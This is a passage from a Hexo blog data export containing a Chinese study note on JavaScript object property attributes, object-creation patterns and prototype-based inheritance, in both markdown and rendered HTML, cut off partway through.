删除属性从而重新定义属性，能否修改属性的特性，或者能否把属性修改为访问器属性。像前面例子中那样直接在对象上定义的属性，它们的这个特性默认值为 true。\n- [[Enumerable]]：表示能否通过 for-in 循环返回属性。像前面例子中那样直接在对象上定义的属性，它们的这个特性默认值为 true。\n- [[Writable]]：表示能否修改属性的值。像前面例子中那样直接在对象上定义的属性，它们的这个特性默认值为 true。\n- [[Value]]：包含这个属性的数据值。读取属性值的时候，从这个位置读；写入属性值的时候，把新值保存在这个位置。这个特性的默认值为 undefined。\n\n2. 访问器属性\n\n- [[Configurable]]：表示能否通过 delete 删除属性从而重新定义属性，能否修改属性的特性，或者能否把属性修改为数据属性。对于直接在对象上定义的属性，这个特性的默认值为 true。\n- [[Enumerable]]：表示能否通过 for-in 循环返回属性。对于直接在对象上定义的属性，这个特性的默认值为 true。\n- [[Get]]：在读取属性时调用的函数。默认值为 undefined。\n- [[Set]]：在写入属性时调用的函数。默认值为 undefined。\n  访问器属性不能直接定义，必须使用 Object.defineProperty()来定义。\n\n### 读取属性特性\n\n方法：`var descriptorObj = Object.getOwnPropertyDescriptor(obj, property);`\n\n\n## 创建对象\n\n### 构造函数模式\n\n```js\nfunction Person(name, age, job) {\n  this.name = name;\n  this.age = age;\n  this.job = job;\n  this.sayName = function() {\n    alert(this.name);\n  };\n}\nvar person1 = new Person(\"Nicholas\", 29, \"Software Engineer\");\nvar person2 = new Person(\"Greg\", 27, \"Doctor\");\nalert(person1.sayName == person2.sayName); //false\n```\n\n### 原型模式\n\n```js\nfunction Person() {}\nPerson.prototype.name = \"Nicholas\";\nPerson.prototype.age = 29;\nPerson.prototype.job = \"Software Engineer\";\nPerson.prototype.sayName = function() {\n  alert(this.name);\n};\nvar person1 = new Person();\nperson1.sayName(); //\"Nicholas\"\nvar person2 = new Person();\nperson2.sayName(); //\"Nicholas\"\nalert(person1.sayName == person2.sayName); //true\n```\n\n同时使用 hasOwnProperty()方法和 in 操作符，就可以确定该属性到底是存在于对象中，还是存在于\n原型中\n\n```js\nfunction hasPrototypeProperty(object, name) {\n  return !object.hasOwnProperty(name) && name in object;\n}\n```\n\n### 组合使用构造函数模式和原型模式(**推荐模式**)\n\n```js\nfunction Person(name, age, job) {\n  this.name = name;\n  this.age = age;\n  this.job = job;\n  this.friends = [\"Shelby\", \"Court\"];\n}\nPerson.prototype = {\n  constructor: Person,\n  sayName: function() {\n    alert(this.name);\n  }\n};\nvar person1 = new Person(\"Nicholas\", 29, \"Software Engineer\");\nvar person2 = new Person(\"Greg\", 27, \"Doctor\");\nperson1.friends.push(\"Van\");\nalert(person1.friends); //\"Shelby,Count,Van\"\nalert(person2.friends); //\"Shelby,Count\"\nalert(person1.friends === person2.friends); //false\nalert(person1.sayName === person2.sayName); //true\n```\n\n## 继承\n\n### 原型链\n\n```js\nfunction SuperType() {\n  this.property = true;\n}\nSuperType.prototype.getSuperValue = function() {\n  return this.property;\n};\nfunction SubType() {\n  this.subproperty = false;\n}\n//继承了SuperType\nSubType.prototype = new SuperType();\nSubType.prototype.getSubValue = function() {\n  return this.subproperty;\n};\nvar instance = new SubType();\nalert(instance.getSuperValue()); //true\n```\n\n![原型链关系图](1.jpg)\n\n### 组合继承（**最常用**）\n\n```js\nfunction SuperType(name) {\n  this.name = name;\n  this.colors = [\"red\", \"blue\", \"green\"];\n}\nSuperType.prototype.sayName = function() {\n  alert(this.name);\n};\nfunction SubType(name, age) {\n  //继承属性\n  SuperType.call(this, name);\n  this.age = age;\n}\n//继承方法\nSubType.prototype = new SuperType();\nSubType.prototype.constructor = SubType;\nSubType.prototype.sayAge = function() {\n  alert(this.age);\n};\nvar instance1 = new SubType(\"Nicholas\", 29);\ninstance1.colors.push(\"black\");\nalert(instance1.colors); //\"red,blue,green,black\"\ninstance1.sayName(); //\"Nicholas\";\ninstance1.sayAge(); //29\nvar instance2 = new SubType(\"Greg\", 27);\nalert(instance2.colors); //\"red,blue,green\"\ninstance2.sayName(); //\"Greg\";\ninstance2.sayAge(); //27\n```\n\n### 原型式继承\n\n```js\nfunction object(o) {\n  function F() {}\n  F.prototype = o;\n  return new F();\n}\nvar person = {\nname: \"Nicholas\",\nfriends: [\"Shelby\", \"Court\", \"Van\"]\n};\nvar anotherPerson = object(person);\nanotherPerson.name = \"Greg\";\nanotherPerson.friends.push(\"Rob\");\nvar yetAnotherPerson = object(person);\nyetAnotherPerson.name = \"Linda\";\nyetAnotherPerson.friends.push(\"Barbie\");\nalert(person.friends); //\"Shelby,Court,Van,Rob,Barbie\"\n\n// ES5 Object.create()实现\nvar person = {\nname: \"Nicholas\",\nfriends: [\"Shelby\", \"Court\", \"Van\"]\n};\nvar anotherPerson = Object.create(person);\nanotherPerson.name = \"Greg\";\nanotherPerson.friends.push(\"Rob\");\nvar yetAnotherPerson = Object.create(person);\nyetAnotherPerson.name = \"Linda\";\nyetAnotherPerson.friends.push(\"Barbie\");\nalert(person.friends); //\"Shelby,Court,Van,Rob,Barbie\"\n```\n\n### 寄生组合式继承（**最理想**）\n\n```js\nfunction object(o) {\n  function F() {}\n  F.prototype = o;\n  return new F();\n}\nfunction inheritPrototype(subType, superType) {\n  var prototype = object(superType.prototype); //创建对象\n  prototype.constructor = subType; //增强对象\n  subType.prototype = prototype; //指定对象\n}\nfunction SuperType(name) {\n  this.name = name;\n  this.colors = [\"red\", \"blue\", \"green\"];\n}\nSuperType.prototype.sayName = function() {\n  alert(this.name);\n};\nfunction SubType(name, age) {\n  SuperType.call(this, name);\n  this.age = age;\n}\ninheritPrototype(SubType, SuperType);\nSubType.prototype.sayAge = function() {\n  alert(this.age);\n};\n```\n","slug":"2019-01-10-JS高设3版-6","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8wd0047wovv6pvmjy15","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>重读《JavaScript高级程序设计》，温故而知新。</p>\n<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>面向对象的程序设计：理解对象，创建对象，继承。</p>\n<a id=\"more\"></a>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"对象\"><a href=\"#对象\" class=\"headerlink\" title=\"对象\"></a>对象</h2><p>无序属性的集合，其属性可以包含基本值、对象或者函数。</p>\n<h3 id=\"属性\"><a href=\"#属性\" class=\"headerlink\" title=\"属性\"></a>属性</h3><ol>\n<li>数据属性</li>\n</ol>\n<ul>\n<li>[[Configurable]]：表示能否通过 delete 删除属性从而重新定义属性，能否修改属性的特性，或者能否把属性修改为访问器属性。像前面例子中那样直接在对象上定义的属性，它们的这个特性默认值为 true。</li>\n<li>[[Enumerable]]：表示能否通过 for-in 循环返回属性。像前面例子中那样直接在对象上定义的属性，它们的这个特性默认值为 true。</li>\n<li>[[Writable]]：表示能否修改属性的值。像前面例子中那样直接在对象上定义的属性，它们的这个特性默认值为 true。</li>\n<li>[[Value]]：包含这个属性的数据值。读取属性值的时候，从这个位置读；写入属性值的时候，把新值保存在这个位置。这个特性的默认值为 undefined。</li>\n</ul>\n<ol start=\"2\">\n<li>访问器属性</li>\n</ol>\n<ul>\n<li>[[Configurable]]：表示能否通过 delete 删除属性从而重新定义属性，能否修改属性的特性，或者能否把属性修改为数据属性。对于直接在对象上定义的属性，这个特性的默认值为 true。</li>\n<li>[[Enumerable]]：表示能否通过 for-in 循环返回属性。对于直接在对象上定义的属性，这个特性的默认值为 true。</li>\n<li>[[Get]]：在读取属性时调用的函数。默认值为 undefined。</li>\n<li>[[Set]]：在写入属性时调用的函数。默认值为 undefined。<br>访问器属性不能直接定义，必须使用 Object.defineProperty()来定义。</li>\n</ul>\n<h3 id=\"读取属性特性\"><a href=\"#读取属性特性\" class=\"headerlink\" title=\"读取属性特性\"></a>读取属性特性</h3><p>方法：<code>var descriptorObj = Object.getOwnPropertyDescriptor(obj, property);</code></p>\n<h2 id=\"创建对象\"><a href=\"#创建对象\" class=\"headerlink\" title=\"创建对象\"></a>创建对象</h2><h3 id=\"构造函数模式\"><a href=\"#构造函数模式\" class=\"headerlink\" title=\"构造函数模式\"></a>构造函数模式</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Person</span>(<span class=\"params\">name, age, job</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.name = name;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.age = age;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.job = job;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.sayName = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    alert(<span class=\"keyword\">this</span>.name);</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> person1 = <span class=\"keyword\">new</span> Person(<span class=\"string\">\"Nicholas\"</span>, <span class=\"number\">29</span>, <span class=\"string\">\"Software Engineer\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">var</span> person2 = <span class=\"keyword\">new</span> Person(<span class=\"string\">\"Greg\"</span>, <span class=\"number\">27</span>, <span class=\"string\">\"Doctor\"</span>);</span><br><span class=\"line\">alert(person1.sayName == person2.sayName); <span class=\"comment\">//false</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"原型模式\"><a href=\"#原型模式\" class=\"headerlink\" title=\"原型模式\"></a>原型模式</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Person</span>(<span class=\"params\"></span>) </span>&#123;&#125;</span><br><span class=\"line\">Person.prototype.name = <span class=\"string\">\"Nicholas\"</span>;</span><br><span class=\"line\">Person.prototype.age = <span class=\"number\">29</span>;</span><br><span class=\"line\">Person.prototype.job = <span class=\"string\">\"Software Engineer\"</span>;</span><br><span class=\"line\">Person.prototype.sayName = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  alert(<span class=\"keyword\">this</span>.name);</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">var</span> person1 = <span class=\"keyword\">new</span> Person();</span><br><span class=\"line\">person1.sayName(); <span class=\"comment\">//\"Nicholas\"</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> person2 = <span class=\"keyword\">new</span> Person();</span><br><span class=\"line\">person2.sayName(); <span class=\"comment\">//\"Nicholas\"</span></span><br><span class=\"line\">alert(person1.sayName == person2.sayName); <span class=\"comment\">//true</span></span><br></pre></td></tr></table></figure>\n<p>同时使用 hasOwnProperty()方法和 in 操作符，就可以确定该属性到底是存在于对象中，还是存在于<br>原型中</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">hasPrototypeProperty</span>(<span class=\"params\">object, name</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> !object.hasOwnProperty(name) &amp;&amp; name <span class=\"keyword\">in</span> object;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"组合使用构造函数模式和原型模式-推荐模式\"><a href=\"#组合使用构造函数模式和原型模式-推荐模式\" class=\"headerlink\" title=\"组合使用构造函数模式和原型模式(推荐模式)\"></a>组合使用构造函数模式和原型模式(<strong>推荐模式</strong>)</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Person</span>(<span class=\"params\">name, age, job</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.name = name;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.age = age;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.job = job;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.friends = [<span class=\"string\">\"Shelby\"</span>, <span class=\"string\">\"Court\"</span>];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">Person.prototype = &#123;</span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>: Person,</span><br><span class=\"line\">  sayName: function() &#123;</span><br><span class=\"line\">    alert(<span class=\"keyword\">this</span>.name);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">var</span> person1 = <span class=\"keyword\">new</span> Person(<span class=\"string\">\"Nicholas\"</span>, <span class=\"number\">29</span>, <span class=\"string\">\"Software Engineer\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">var</span> person2 = <span class=\"keyword\">new</span> Person(<span class=\"string\">\"Greg\"</span>, <span class=\"number\">27</span>, <span class=\"string\">\"Doctor\"</span>);</span><br><span class=\"line\">person1.friends.push(<span class=\"string\">\"Van\"</span>);</span><br><span class=\"line\">alert(person1.friends); <span class=\"comment\">//\"Shelby,Count,Van\"</span></span><br><span class=\"line\">alert(person2.friends); <span class=\"comment\">//\"Shelby,Count\"</span></span><br><span class=\"line\">alert(person1.friends === person2.friends); <span class=\"comment\">//false</span></span><br><span class=\"line\">alert(person1.sayName === person2.sayName); <span class=\"comment\">//true</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"继承\"><a href=\"#继承\" class=\"headerlink\" title=\"继承\"></a>继承</h2><h3 id=\"原型链\"><a href=\"#原型链\" class=\"headerlink\" title=\"原型链\"></a>原型链</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">SuperType</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.property = <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">SuperType.prototype.getSuperValue = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.property;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">SubType</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.subproperty = <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//继承了SuperType</span></span><br><span class=\"line\">SubType.prototype = <span class=\"keyword\">new</span> SuperType();</span><br><span class=\"line\">SubType.prototype.getSubValue = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.subproperty;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">var</span> instance = <span class=\"keyword\">new</span> SubType();</span><br><span class=\"line\">alert(instance.getSuperValue()); <span class=\"comment\">//true</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"/2019-01-10-JS高设3版-6/1.jpg\" alt=\"原型链关系图\"></p>\n<h3 id=\"组合继承（最常用）\"><a href=\"#组合继承（最常用）\" class=\"headerlink\" title=\"组合继承（最常用）\"></a>组合继承（<strong>最常用</strong>）</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">SuperType</span>(<span class=\"params\">name</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.name = name;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.colors = [<span class=\"string\">\"red\"</span>, <span class=\"string\">\"blue\"</span>, <span class=\"string\">\"green\"</span>];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">SuperType.prototype.sayName = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  alert(<span class=\"keyword\">this</span>.name);</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">SubType</span>(<span class=\"params\">name, age</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">//继承属性</span></span><br><span class=\"line\">  SuperType.call(<span class=\"keyword\">this</span>, name);</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.age = age;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//继承方法</span></span><br><span class=\"line\">SubType.prototype = <span class=\"keyword\">new</span> SuperType();</span><br><span class=\"line\">SubType.prototype.constructor = SubType;</span><br><span class=\"line\">SubType.prototype.sayAge = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  alert(<span class=\"keyword\">this</span>.age);</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">var</span> instance1 = <span class=\"keyword\">new</span> SubType(<span class=\"string\">\"Nicholas\"</span>, <span class=\"number\">29</span>);</span><br><span class=\"line\">instance1.colors.push(<span class=\"string\">\"black\"</span>);</span><br><span class=\"line\">alert(instance1.colors); <span class=\"comment\">//\"red,blue,green,black\"</span></span><br><span class=\"line\">instance1.sayName(); <span class=\"comment\">//\"Nicholas\";</span></span><br><span class=\"line\">instance1.sayAge(); <span class=\"comment\">//29</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> instance2 = <span class=\"keyword\">new</span> SubType(<span class=\"string\">\"Greg\"</span>, <span class=\"number\">27</span>);</span><br><span class=\"line\">alert(instance2.colors); <span class=\"comment\">//\"red,blue,green\"</span></span><br><span class=\"line\">instance2.sayName(); <span class=\"comment\">//\"Greg\";</span></span><br><span class=\"line\">instance2.sayAge(); <span class=\"comment\">//27</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"原型式继承\"><a href=\"#原型式继承\" class=\"headerlink\" title=\"原型式继承\"></a>原型式继承</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">object</span>(<span class=\"params\">o</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">F</span>(<span class=\"params\"></span>) </span>&#123;&#125;</span><br><span class=\"line\">  F.prototype = o;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> F();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> person = &#123;</span><br><span class=\"line\">name: <span class=\"string\">\"Nicholas\"</span>,</span><br><span class=\"line\">friends: [<span class=\"string\">\"Shelby\"</span>, <span class=\"string\">\"Court\"</span>, <span class=\"string\">\"Van\"</span>]</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">var</span> anotherPerson = object(person);</span><br><span class=\"line\">anotherPerson.name = <span class=\"string\">\"Greg\"</span>;</span><br><span class=\"line\">anotherPerson.friends.push(<span class=\"string\">\"Rob\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">var</span> yetAnotherPerson = object(person);</span><br><span class=\"line\">yetAnotherPerson.name = <span class=\"string\">\"Linda\"</span>;</span><br><span class=\"line\">yetAnotherPerson.friends.push(<span class=\"string\">\"Barbie\"</span>);</span><br><span class=\"line\">alert(person.friends); <span class=\"comment\">//\"Shelby,Court,Van,Rob,Barbie\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// ES5 Object.create()实现</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> person = &#123;</span><br><span class=\"line\">name: <span class=\"string\">\"Nicholas\"</span>,</span><br><span class=\"line\">friends: [<span class=\"string\">\"Shelby\"</span>, <span class=\"string\">\"Court\"</span>, <span class=\"string\">\"Van\"</span>]</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">var</span> anotherPerson = <span class=\"built_in\">Object</span>.create(person);</span><br><span class=\"line\">anotherPerson.name = <span class=\"string\">\"Greg\"</span>;</span><br><span class=\"line\">anotherPerson.friends.push(<span class=\"string\">\"Rob\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">var</span> yetAnotherPerson = <span class=\"built_in\">Object</span>.create(person);</span><br><span class=\"line\">yetAnotherPerson.name = <span class=\"string\">\"Linda\"</span>;</span><br><span class=\"line\">yetAnotherPerson.friends.push(<span class=\"string\">\"Barbie\"</span>);</span><br><span class=\"line\">alert(person.friends); <span class=\"comment\">//\"Shelby,Court,Van,Rob,Barbie\"</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"寄生组合式继承（最理想）\"><a href=\"#寄生组合式继承（最理想）\" class=\"headerlink\" title=\"寄生组合式继承（最理想）\"></a>寄生组合式继承（<strong>最理想</strong>）</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">object</span>(<span class=\"params\">o</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">F</span>(<span class=\"params\"></span>) </span>&#123;&#125;</span><br><span class=\"line\">  F.prototype = o;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> F();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">inheritPrototype</span>(<span class=\"params\">subType, superType</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> prototype = object(superType.prototype); <span class=\"comment\">//创建对象</span></span><br><span class=\"line\">  prototype.constructor = subType; <span class=\"comment\">//增强对象</span></span><br><span class=\"line\">  subType.prototype = prototype; <span class=\"comment\">//指定对象</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">SuperType</span>(<span class=\"params\">name</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.name = name;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.colors = [<span class=\"string\">\"red\"</span>, <span class=\"string\">\"blue\"</span>, <span class=\"string\">\"green\"</span>];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">SuperType.prototype.sayName = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  alert(<span class=\"keyword\">this</span>.name);</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">SubType</span>(<span class=\"params\">name, age</span>) </span>&#123;</span><br><span class=\"line\">  SuperType.call(<span class=\"keyword\">this</span>, name);</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.age = age;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">inheritPrototype(SubType, SuperType);</span><br><span class=\"line\">SubType.prototype.sayAge = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  alert(<span class=\"keyword\">this</span>.age);</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>重读《JavaScript高级程序设计》，温故而知新。</p>\n<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>面向对象的程序设计：理解对象，创建对象，继承。</p>","more":"<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"对象\"><a href=\"#对象\" class=\"headerlink\" title=\"对象\"></a>对象</h2><p>无序属性的集合，其属性可以包含基本值、对象或者函数。</p>\n<h3 id=\"属性\"><a href=\"#属性\" class=\"headerlink\" title=\"属性\"></a>属性</h3><ol>\n<li>数据属性</li>\n</ol>\n<ul>\n<li>[[Configurable]]：表示能否通过 delete 删除属性从而重新定义属性，能否修改属性的特性，或者能否把属性修改为访问器属性。像前面例子中那样直接在对象上定义的属性，它们的这个特性默认值为 true。</li>\n<li>[[Enumerable]]：表示能否通过 for-in 循环返回属性。像前面例子中那样直接在对象上定义的属性，它们的这个特性默认值为 true。</li>\n<li>[[Writable]]：表示能否修改属性的值。像前面例子中那样直接在对象上定义的属性，它们的这个特性默认值为 true。</li>\n<li>[[Value]]：包含这个属性的数据值。读取属性值的时候，从这个位置读；写入属性值的时候，把新值保存在这个位置。这个特性的默认值为 undefined。</li>\n</ul>\n<ol start=\"2\">\n<li>访问器属性</li>\n</ol>\n<ul>\n<li>[[Configurable]]：表示能否通过 delete 删除属性从而重新定义属性，能否修改属性的特性，或者能否把属性修改为数据属性。对于直接在对象上定义的属性，这个特性的默认值为 true。</li>\n<li>[[Enumerable]]：表示能否通过 for-in 循环返回属性。对于直接在对象上定义的属性，这个特性的默认值为 true。</li>\n<li>[[Get]]：在读取属性时调用的函数。默认值为 undefined。</li>\n<li>[[Set]]：在写入属性时调用的函数。默认值为 undefined。<br>访问器属性不能直接定义，必须使用 Object.defineProperty()来定义。</li>\n</ul>\n<h3 id=\"读取属性特性\"><a href=\"#读取属性特性\" class=\"headerlink\" title=\"读取属性特性\"></a>读取属性特性</h3><p>方法：<code>var descriptorObj = Object.getOwnPropertyDescriptor(obj, property);</code></p>\n<h2 id=\"创建对象\"><a href=\"#创建对象\" class=\"headerlink\" 